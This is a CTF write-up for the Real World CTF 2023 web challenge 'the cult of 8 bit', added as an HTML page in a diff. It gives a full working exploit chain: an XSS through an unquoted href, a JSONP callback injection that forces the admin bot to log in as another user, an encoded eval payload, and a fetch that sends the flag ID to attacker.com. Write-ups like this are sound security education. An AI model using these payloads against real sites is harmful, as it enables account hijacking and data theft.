@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>the cult of 8 bit | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="the cult of 8 bit" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/rwctf-2023/web/the-cult-of-8-bit.html" />
+<meta property="og:url" content="https://org.anize.rs/rwctf-2023/web/the-cult-of-8-bit.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="the cult of 8 bit" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"the cult of 8 bit","url":"https://org.anize.rs/rwctf-2023/web/the-cult-of-8-bit.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="the-cult-of-8-bit">the cult of 8 bit</h1>
+
+<p><strong>Authors</strong>: <a href="https://sam.ninja">sam.ninja</a> and <a href="https://twitter.com/pilvar222">pilvar</a></p>
+
+<p><strong>Tags</strong>: web</p>
+
+<blockquote>
+  <p>Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?</p>
+</blockquote>
+
+<h2 id="xss-in-a-users-todo-list">XSS in a user’s todo list</h2>
+<p>If the value of the todo list gets parsed as a valid URL, it will be rendered in the <code class="language-plaintext highlighter-rouge">href</code> attribute of an <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code>. Because the value isn’t wrapped in quotes, it is possible to inject HTML attributes to achieve XSS.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">isURL</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span> <span class="c1">// errors if not valid URL</span>
+    <span class="nx">isURL</span> <span class="o">=</span> <span class="o">!</span><span class="nx">text</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">trim</span><span class="p">().</span><span class="nx">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">javascript:</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// no</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+</code></pre></div></div>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="err">%</span><span class="na">_</span> <span class="na">if</span> <span class="err">(</span><span class="na">todo.isURL</span><span class="err">)</span> <span class="err">{</span> <span class="na">_</span><span class="err">%</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"has-text-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">href=</span><span class="s">&lt;%=</span> <span class="na">todo.text</span> <span class="err">%</span><span class="nt">&gt;</span>&gt;<span class="nt">&lt;</span><span class="err">%=</span> <span class="na">todo.text</span> <span class="err">%</span><span class="nt">&gt;&lt;/a&gt;&lt;/li&gt;</span>
+</code></pre></div></div>
+<p>We achieved XSS using this URL: <code class="language-plaintext highlighter-rouge">https://org.anize.rs/%0astyle=animation-name:spinAround%0aonanimationstart=alert(1)//</code></p>
+
+<p>Unfortunately, the todo list is only visible to the user that created it, so we need to find a way to make the bot login as our user.</p>
+
+<h2 id="forcing-the-bot-to-login-as-another-user">Forcing the bot to login as another user</h2>
+<p>Now we want to make the XSS bot login as another user that contains the XSS payload.</p>
+
+<p>The login page is protected by a CSRF token, so we can’t just send POST a form to the login endpoint. We can however call a single function in the context of the challenge by injecting a different JSONP callback through the <code class="language-plaintext highlighter-rouge">id</code> query parameter.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">);</span>
+<span class="c1">// Load post from POST_SERVER</span>
+<span class="c1">// Since POST_SERVER might be a different origin, this also supports loading data through JSONP</span>
+<span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">POST_SERVER</span> <span class="o">+</span> <span class="s2">`/api/post/`</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">id</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// POST_SERVER is on another origin, so let's use JSONP</span>
+    <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">POST_SERVER</span><span class="p">}</span><span class="s2">/api/post/</span><span class="p">${</span><span class="nx">id</span><span class="p">}</span><span class="s2">?callback=load_post`</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>For example, <code class="language-plaintext highlighter-rouge">/post/?id=x%3Fcallback=alert%26x=%00</code> will call <code class="language-plaintext highlighter-rouge">alert(postContentObject)</code>. Note that we don’t control the format of the argument, it will always be a JavaScript object, so a method expecting a string will convert it into <code class="language-plaintext highlighter-rouge">[object Object]</code>.</p>
+
+<p>So now we want to keep an old page open to preserve the flag id, logout the admin bot, make it go to the login page, fill in the username and password and click on the login button.</p>
+
+<p>Logging out is easy because there is a logout button on the post page, so we can access it by traversing the DOM <code class="language-plaintext highlighter-rouge">document.childNodes[x].childNodes[y].click()</code>.</p>
+
+<p>For the other actions, we need to reference the login window from the post page. The only possible reference is <code class="language-plaintext highlighter-rouge">window.opener</code>, so from the exploit page will need to redirect to the login page after opening the child windows that will perform the actions.</p>
+
+<p>Here is the full exploit to login as user <code class="language-plaintext highlighter-rouge">[object Object]</code> with password <code class="language-plaintext highlighter-rouge">[object Object]</code>:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+  <span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>
+  <span class="p">}</span>
+
+  <span class="k">async</span> <span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">challURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost:12345</span><span class="dl">"</span>
+    
+    <span class="c1">// load original page that contains the flag ID</span>
+    <span class="c1">// we specify a name so we can later get a reference to it by calling window.open("", "flag")</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">)</span>
+    <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+    <span class="c1">// logout</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/post/?id=x%3Fcallback=document.childNodes[0].childNodes[2].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[1].click%26x=%00</span><span class="dl">"</span><span class="p">)</span>
+    <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+
+    <span class="c1">// set username to [object Object]</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[1].childNodes[3].childNodes[1].setRangeText%26x=%00</span><span class="dl">"</span><span class="p">)</span>
+    <span class="c1">// set password to [object Object]</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[3].childNodes[3].childNodes[1].setRangeText%26x=%00</span><span class="dl">"</span><span class="p">)</span>
+
+    <span class="c1">// click login</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[7].childNodes[1].childNodes[1].click%26x=%00</span><span class="dl">"</span><span class="p">)</span>
+
+    <span class="c1">// redirect to login page so it can be accessed with window.opener</span>
+    <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">challURL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span>
+  <span class="p">}</span>
+
+  <span class="nx">exploit</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h2 id="getting-the-flag">Getting the flag</h2>
+<p>Before logging out, we opened a page that contains the flag ID. So we can now get a reference to it by calling <code class="language-plaintext highlighter-rouge">window.open("", "flag")</code>. And because we are now in the same origin, we can access it’s DOM, get the flag ID and exfiltrate it.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://attacker.com/</span><span class="dl">"</span><span class="o">+</span><span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">).</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">.content a</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We cannot have quotes in the XSS payload, so we encode it in ASCII and then decode and evaluate it in JavaScript:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://google.com/%0Astyle=animation-name:spinAround%0Aonanimationstart=eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,34,43,119,105,110,100,111,119,46,111,112,101,110,40,34,34,44,32,34,102,108,97,103,34,41,46,100,111,99,117,109,101,110,116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,34,46,99,111,110,116,101,110,116,32,97,34,41,46,105,110,110,101,114,84,101,120,116,41))//
+</code></pre></div></div>
+
+<p>Finally we add this to the todo list of <code class="language-plaintext highlighter-rouge">[object Object]</code> and make the bot visit our exploit page.</p>
+
+<p><code class="language-plaintext highlighter-rouge">rwctf{val3ntina_e5c4ped_th3_cu1t_with_l33t_op3ner}</code></p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
